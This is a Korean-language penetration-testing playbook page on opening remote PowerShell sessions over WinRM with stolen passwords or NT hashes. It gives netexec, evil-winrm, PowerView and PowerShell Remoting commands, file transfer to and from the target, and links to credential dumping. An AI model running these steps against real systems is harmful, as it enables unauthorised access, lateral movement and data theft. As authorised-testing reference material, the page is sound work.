---
tags:
  - 환경/windows
  - 서비스/winrm
시작조건: ["공격 호스트에서 <TARGET>:5985 또는 5986 WinRM 서비스 응답", "Windows 계정 plaintext password 또는 NT hash 확보"]
필요권한: ["대상 호스트의 WinRM 로그온 권한"]
필요조건: ["<TARGET>에서 유효한 사용자 plaintext password 또는 NT hash", "공격 호스트에서 <TARGET>:5985 또는 5986/TCP 연결 가능"]
결과: ["대상 계정 Identity의 원격 PowerShell 세션", "WinRM 세션 범위의 명령 실행과 파일 전송"]
---

# WinRM 원격 PowerShell 세션

## 한 줄 판단

공격 호스트에서 `<TARGET>:5985/5986`에 연결할 수 있고 확보한 Windows plaintext password 또는 NT hash가 대상의 WinRM 로그온 권한을 가진 계정에 해당하면, Evil-WinRM으로 그 계정 Identity의 원격 PowerShell 세션을 연다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 공격 호스트에서 `<TARGET>:5985` 또는 `5986/TCP` 연결 가능 | `nmap -p5985,5986 <TARGET>`과 WinRM HTTP/HTTPS 응답 확인 | 대상 주소, 방화벽, HTTP·HTTPS와 TLS 옵션 확인 |
| 현재 계정 또는 인증 수단 | `<TARGET>`에서 유효한 사용자 plaintext password 또는 NT hash | `netexec winrm`의 인증 결과 | 사용자 이름의 로컬·도메인 범위, password·hash 형식과 만료 상태 확인 |
| 현재 권한 | 계정에 WinRM 로그온 권한이 있고, 관리자 작업에는 상승된 관리자 token 보유 | Remote Management Users·Administrators 후보와 Evil-WinRM prompt의 `whoami /all` 확인 | 그룹 멤버십, endpoint ACL, UAC와 token 상태 확인 |
| 공격 대상의 조건 | 대상 WinRM endpoint가 활성화되고 선택한 인증·TLS 방식을 허용 | NetExec 결과와 Evil-WinRM 접속 로그 확인 | SPN, hostname, Kerberos realm, `-S`와 HTTPS 인증 설정 확인 |
| 필요한 파일·목록·주소 | `<TARGET>`, `<USER>`, password 또는 NTLM hash, 필요 시 업로드·다운로드 경로 | 대상·계정 범위와 로컬 파일 존재 확인 | 잘못된 대상 이름, credential 종류와 파일 경로 수정 |

## 실행

### 인증 방식 선택

| 보유 인증 자료 | NetExec 검증 | Evil-WinRM 세션 | 성공 범위 |
|---|---|---|---|
| `<USER>`의 plaintext password | `-p '<PASSWORD>'` | `-p`를 생략한 password prompt | WinRM 인증 뒤 해당 계정의 PowerShell 세션 |
| `<USER>`의 NT hash | `-H <NTLM_HASH>` | `-H <NTLM_HASH>` | NTLM Pass the Hash 인증 뒤 해당 계정의 PowerShell 세션 |

두 방식 모두 대상의 WinRM endpoint 로그온 권한이 필요하다. NetExec `[+]`는 인증 성공, Evil-WinRM prompt는 재사용 가능한 세션, `whoami /all`은 실제 token과 관리자 권한 확인이다.

1. 공격 호스트에서 `<TARGET>:5985/5986` WinRM 서비스 응답을 확인한다.
2. NetExec으로 보유 plaintext password 또는 NT hash의 WinRM 인증 성공 여부를 확인한다.
3. Evil-WinRM으로 실제 원격 PowerShell 세션을 연다.
4. `<TARGET>`에서 `whoami /all`, `hostname`, `ipconfig`로 원격 계정, token 권한과 네트워크 위치를 확인한다.
5. 확인한 권한 범위 안에서 파일 업로드·다운로드, 로컬 열거와 credential hunting으로 이어간다.

### Windows 공격 호스트에서 실행

#### 로그인 전 그룹 권한 후보 확인

```powershell
Import-Module .\PowerView.ps1
Get-NetLocalGroupMember -ComputerName '<TARGET>' -GroupName 'Remote Management Users' |
  Select-Object ComputerName,GroupName,MemberName,SID,IsGroup,IsDomain
```

확인할 출력:

- 로컬 그룹 구성원의 `MemberName`과 `SID`. `Get-NetLocalGroupMember`는 `MemberSID`가 아닌 `SID` 필드를 반환한다.
- 현재 로그온 계정이 아닌 별도 `<USER>`를 판정할 때는 [[AD 원격 접근 권한 열거]]에서 사용자·중첩 도메인 그룹 SID와 대조한다.
- 그룹 멤버십이나 BloodHound `CanPSRemote` edge는 실제 WinRM endpoint와 prompt를 보장하지 않으며 관리자 실행을 보장하지도 않는다.

#### PowerShell Remoting으로 접속

현재 Windows 세션에서 상대 도메인 계정의 평문 비밀번호를 사용할 수 있으면 native PowerShell Remoting으로 실제 로그온을 확인한다.

```powershell
$cred = Get-Credential '<SOURCE_DOMAIN>\<USER>'
Enter-PSSession -ComputerName <TARGET_FQDN> -Credential $cred
```

확인할 출력:

- `[<TARGET_FQDN>]: PS C:\...>` 형식의 원격 prompt.
- `whoami`가 입력한 `<SOURCE_DOMAIN>\<USER>`로 표시되고 `hostname`이 `<TARGET_FQDN>`의 호스트와 일치해야 한다.
- forest trust와 외부 그룹 멤버십은 로그인 후보를 설명할 뿐이며, 이 prompt와 원격 명령 출력이 실제 WinRM 접근 성공을 입증한다.

#### PowerShell Remoting 세션으로 파일 복사

Windows 공격 호스트에서 재사용할 세션 객체를 만들고 파일 방향에 따라 `-ToSession` 또는 `-FromSession`을 선택한다.

```powershell
$Session = New-PSSession -ComputerName <TARGET_FQDN> -Credential $cred
Copy-Item -Path <LOCAL_SOURCE_FILE> -ToSession $Session -Destination <REMOTE_DESTINATION>
Copy-Item -Path <REMOTE_SOURCE_FILE> -FromSession $Session -Destination <LOCAL_DESTINATION>
```

`<LOCAL_SOURCE_FILE>`와 `<LOCAL_DESTINATION>`은 공격 호스트의 경로(예: `./tool.ps1`, `./collected.txt`)다. `<REMOTE_DESTINATION>`과 `<REMOTE_SOURCE_FILE>`은 `<TARGET_FQDN>`의 PowerShell 세션 경로(예: `C:\\Temp\\tool.ps1`, `C:\\Temp\\collected.txt`)다. `-ToSession`은 앞의 local source를 remote destination으로 보내고, `-FromSession`은 remote source를 앞의 local destination으로 회수한다.

무결성 비교가 필요한 경우에는 실제로 선택한 같은 전송쌍만 비교한다. 아래는 `-ToSession`의 `<LOCAL_SOURCE_FILE> ↔ <REMOTE_DESTINATION>` 쌍이며, `-FromSession`을 선택했다면 `<REMOTE_SOURCE_FILE> ↔ <LOCAL_DESTINATION>`으로 같은 방식으로 바꾼다.

```powershell
Get-Item -LiteralPath <LOCAL_SOURCE_FILE>
Get-FileHash -LiteralPath <LOCAL_SOURCE_FILE> -Algorithm SHA256
Invoke-Command -Session $Session -ScriptBlock { Get-Item -LiteralPath '<REMOTE_DESTINATION>'; Get-FileHash -LiteralPath '<REMOTE_DESTINATION>' -Algorithm SHA256 }
```

- `New-PSSession` 실패는 WinRM 인증·endpoint 문제다.
- 세션은 생성됐지만 `Copy-Item`이 실패하면 원본 읽기, 대상 경로 쓰기 ACL과 경로 형식을 확인한다.
- `-ToSession`은 공격 호스트에서 대상으로 반입하고 `-FromSession`은 대상에서 공격 호스트로 회수한다.

### Linux 공격 호스트에서 실행

#### 인증 검증

```bash
netexec winrm <TARGET> -u <USER> -p '<PASSWORD>'
netexec winrm <TARGET> -u <USER> -H <NTLM_HASH>
```

확인할 출력:

- `[+]`는 `<TARGET>` WinRM 인증 성공이다. `(Pwn3d!)`는 관리자급 원격 실행 가능성 신호이므로 실제 token은 세션에서 다시 확인한다.
- 이 단계는 credential 검증이며, Evil-WinRM prompt가 나타나기 전에는 재사용 가능한 PowerShell 세션을 확보한 것이 아니다.

#### Evil-WinRM 접속

```bash
evil-winrm -i <TARGET> -u <USER>
evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>
```

확인할 출력:

- `*Evil-WinRM* PS C:\Users\...>` prompt는 `<TARGET>`의 WinRM 로그온과 원격 PowerShell 세션 확보를 입증한다.
- 평문 비밀번호 방식은 `-p`를 생략하고 prompt에 `<PASSWORD>`를 입력해 shell history·process 인자에 남기지 않는다.
- `whoami /all`로 실제 사용자, 그룹, privilege와 token 상태를 확인하기 전에는 일반 사용자와 상승된 관리자를 구분할 수 없다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| NetExec에 `[+]`가 표시됨 | 보유 credential로 `<TARGET>` WinRM 인증 성공 | 인증된 WinRM 계정 | Evil-WinRM으로 실제 세션 생성 확인 |
| PowerShell prompt가 열림 | WinRM 로그온 권한과 재사용 가능한 원격 세션 확인 | 대상 계정의 PowerShell 세션 | `whoami /all`, `hostname`, `ipconfig`로 계정, 호스트와 네트워크 위치 확인 |
| 다른 도메인 계정으로 `Enter-PSSession` prompt가 열림 | trust 방향과 외부 그룹 멤버십이 대상 WinRM 로그온 권한으로 평가됨 | 신뢰 대상 도메인 호스트의 원격 세션 | [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]에서 실제 그룹·관리자 token 확인 |
| `whoami`, `hostname`, `ipconfig`가 실행됨 | 원격 명령 실행 컨텍스트 확인 | 대상 호스트의 명령 실행 | [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]에서 일반 사용자·관리자 상태 재평가 |
| 업로드/다운로드 명령으로 파일을 주고받을 수 있다. | WinRM 파일 전송 가능 | 파일 전송 | [[상황별 파일 전송]]에서 파일 크기와 방향에 맞는 방식 선택 |
| 인증 성공, Evil-WinRM 실패 | SPN/TLS/권한 문제 | 시작 상태 유지 | `-S`, hostname, Kerberos realm, HTTPS 확인 |
| 로컬 명령은 성공하나 DC·두 번째 호스트 접근만 실패 | Kerberos ticket 전달 제한 가능 | WinRM 세션은 유지되나 AD 리소스 접근 실패 | [[WinRM Kerberos Double Hop 진단과 재인증]] |
| WinRM 접근 불가 | 서비스 비활성 또는 방화벽 | 시작 상태 유지 | SMB/WMI/RDP 대체 |
| `whoami /all`에서 상승된 관리자 token이 확인되지 않음 | WinRM 세션은 성공했지만 관리자 권한은 없음 | 일반 사용자 원격 PowerShell 세션 | 파일·공유·로컬 열거 후 [[Windows 권한 상승 열거]] |

## 확인할 출력과 권한

- credential 보유, NetExec `[+]` 인증 성공, Evil-WinRM prompt, 원격 명령 출력과 상승된 관리자 token은 서로 다른 확인 지점이다.
- `(Pwn3d!)`만으로 권한 확대를 판단하지 말고 `whoami /all`에서 현재 사용자, Administrators 그룹과 실제 token·privilege를 확인한다.

## 변경 영향과 복구

`Copy-Item -ToSession`으로 대상에 파일을 만들었다면 `<REMOTE_DESTINATION>`의 이번 생성 파일만 제거하고 부재를 확인한다. `-FromSession`으로 회수한 `<LOCAL_DESTINATION>`은 공격 호스트에서 별도로 관리하며, 대상 파일을 자동으로 삭제하지 않는다.

```powershell
Invoke-Command -Session $Session -ScriptBlock { Remove-Item -LiteralPath '<REMOTE_DESTINATION>'; Test-Path -LiteralPath '<REMOTE_DESTINATION>' }
Remove-PSSession $Session
```

`False`가 반환되면 대상 파일이 제거된 것이다. `-FromSession`으로 공격 호스트에 만든 회수본은 분석·보관 여부에 따라 별도로 관리한다.

`Enter-PSSession`으로 열어 둔 대화형 세션은 해당 prompt에서 `Exit-PSSession`으로 종료한다. Evil-WinRM은 `exit`로 종료한 뒤 로컬 prompt로 복귀했는지 확인한다. 세션 종료는 세션에서 생성한 원격 파일·process를 자동 정리했다는 뜻이 아니므로, 생성한 항목은 연결이 살아 있을 때 exact 식별자로 먼저 정리한다.

## 후속 공격 연결

- 파일 반입/회수: [[상황별 파일 전송]]
- 로컬 credential: [[Windows 저장 자격증명 수집]]
- 관리자 권한: [[Windows SAM SECURITY SYSTEM 덤프]], [[LSASS 메모리 덤프]]

## 관련 서비스

- [[WinRM 서비스]]

## 관련 상태 라우터

- WinRM 세션의 실제 계정과 권한을 확인할 때: [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]

## 관련 도구

- [[evil-winrm]]
- [[netexec]]
- [[powershell]]

## 참고 링크

- [Microsoft: Enter-PSSession](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession)
- [Microsoft: Installation and configuration for Windows Remote Management](https://learn.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management)
- [SpecterOps BloodHound: CanPSRemote](https://bloodhound.specterops.io/resources/edges/can-ps-remote)
- [Hackplayers: Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
